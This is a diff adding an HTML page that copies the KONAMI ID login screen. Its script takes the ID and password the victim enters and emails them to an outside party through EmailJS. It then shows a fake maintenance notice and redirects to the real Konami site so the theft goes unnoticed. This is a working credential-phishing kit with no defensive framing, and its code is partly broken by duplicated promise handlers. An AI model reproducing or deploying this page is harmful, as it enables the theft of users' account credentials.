@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KONAMI ID Login Recreation</title>
+    <style>
+        /* Basic Reset and Setup */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+
+        /* Container for the form */
+        .konami-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin-top: 0px;
+        }
+
+        /* KONAMI Logo */
+        .konami-logo {
+            color: #d80011;
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        /* Main Heading */
+        .konami-heading {
+            font-size: 24px;
+            font-weight: normal;
+            margin-bottom: 25px;
+            color: #333;
+        }
+
+        /* Input Fields */
+        .konami-input {
+            width: calc(100% - 24px);
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        /* Password container */
+        .password-container {
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #666;
+        }
+
+        /* Primary Button (Log In) */
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #d80011;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: background-color 0.3s;
+        }
+
+        .submit-btn:hover {
+            background-color: #b3000e;
+        }
+
+        /* Secondary Button (Passkey) */
+        .konami-button-secondary {
+            width: 100%;
+            padding: 12px;
+            background-color: #d80011;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: background-color 0.3s;
+        }
+
+        .konami-button-secondary:hover {
+            background-color: #b3000e;
+        }
+
+        /* Separator */
+        .konami-separator {
+            color: #888;
+            margin-bottom: 20px;
+            position: relative;
+            font-size: 14px;
+        }
+        .konami-separator::before,
+        .konami-separator::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background: #ccc;
+        }
+        .konami-separator::before {
+            left: 0;
+        }
+        .konami-separator::after {
+            right: 0;
+        }
+
+        /* Links */
+        .konami-link {
+            display: block;
+            margin-bottom: 15px;
+            color: #007bff;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .konami-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Register text */
+        .konami-register-text {
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .konami-register-link {
+            color: #d80011;
+            font-weight: bold;
+            text-decoration: none;
+            font-size: 16px;
+        }
+        .konami-register-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Messages */
+        .message {
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            display: none;
+        }
+
+        .error-message {
+            background-color: #ffebee;
+            color: #c62828;
+            border: 1px solid #ffcdd2;
+        }
+
+        .success-message {
+            background-color: #e8f5e9;
+            color: red;
+            border: 1px solid #c8e6c9;
+        }
+    </style>
+</head>
+<body>
+    <div class="konami-container">
+        <div class="konami-logo">
+            <img src="a.jpg" style="width:400px;height:50px;">
+        </div>
+        
+        <div class="konami-heading">KONAMI ID</div>
+        
+        <!-- Success and Error Messages -->
+        <div id="success-message" class="message success-message">
+            Server is under mantainance till 5:00
+        </div>
+        <div id="error-message" class="message error-message">
+            Please fill in all fields
+        </div>
+        
+        <!-- Form Element Added -->
+        <form id="konami-form">
+            <input type="text" class="konami-input" id="konamiId" name="konamiId" placeholder="KONAMI ID / E-mail address" required>
+            
+            <!-- Password Container with Toggle Button -->
+            <div class="password-container">
+                <input type="password" class="konami-input" id="password" name="password" placeholder="Password" required>
+                <button type="button" class="password-toggle" id="toggle-password">Show</button>
+            </div>
+            
+            <button type="submit" class="submit-btn" id="submit-btn">Log In</button>
+        </form>
+        
+        <div class="konami-separator">OR</div>
+        
+        <button class="konami-button-secondary">
+            <span style="font-size: 18px;">??</span>
+            <span>Logging in With a Passkey</span>
+        </button>
+        
+        <a href="#" class="konami-link">What is a Passkey?</a>
+        
+        <div class="konami-register-text">Don't have a KONAMI ID?</div>
+        <a href="#" class="konami-register-link">Register</a>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS with your public key
+        emailjs.init('QKarohsQqRIAA6_mA');
+        
+        // Toggle password visibility
+        document.getElementById('toggle-password').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.textContent = type === 'password' ? 'Show' : 'Hide';
+        });
+        
+        // Form submission
+        document.getElementById('konami-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submit-btn');
+            const originalText = submitBtn.textContent;
+            
+            // Show loading state
+            submitBtn.textContent = 'Log In';
+            submitBtn.disabled = true;
+            
+            // Get form values
+            const konamiId = document.getElementById('konamiId').value;
+            const password = document.getElementById('password').value;
+            
+            // Validate form inputs
+            if (!konamiId || !password) {
+                document.getElementById('error-message').textContent = 'Please fill in all fields';
+                document.getElementById('error-message').style.display = 'block';
+                document.getElementById('success-message').style.display = 'none';
+                
+                // Reset button state
+                submitBtn.textContent = originalText;
+                submitBtn.disabled = false;
+                return;
+            }
+            
+            // Prepare template parameters
+            const templateParams = {
+                konamiId: konamiId,
+                password: password,
+                submitted_at: new Date().toLocaleString()
+            };
+            
+            // Send email using EmailJS
+            emailjs.send('service_u8nndmi', 'template_zs2mpvq', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    
+                    // Show success message
+                    document.getElementById('success-message').style.display = 'block';
+                    document.getElementById('error-message').style.display = 'none';
+                    
+                    // Reset form
+                    document.getElementById('konami-form').reset();
+                })
+                .catch(function(error) {
+                    console.log('FAILED...', error);
+                    
+                    // Show error message
+                    document.getElementById('error-message').textContent = 'Failed to submit. Please try again.';
+                    document.getElementById('error-message').style.display = 'block';
+                    document.getElementById('success-message').style.display = 'none';
+                })
+                .finally(function() {
+                    // Reset button state
+                    submitBtn.textContent = originalText;
+                    submitBtn.disabled = false;
+                
+            setTimeout(() => {
+                    window.location.href = 'https://my.konami.net/en_US';
+                }, 1000); // Redirect after 1 second delay
+            })
+            .catch(function(error) {
+                console.log('FAILED...', error);
+                
+                // Show error message
+                errorMessage.textContent = 'Failed to sign in. Please try again.';
+                errorMessage.style.display = 'block';
+            })
+            .finally(function() {
+                // Reset button state after success or failure
+                submitBtn.textContent = originalText;
+                submitBtn.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
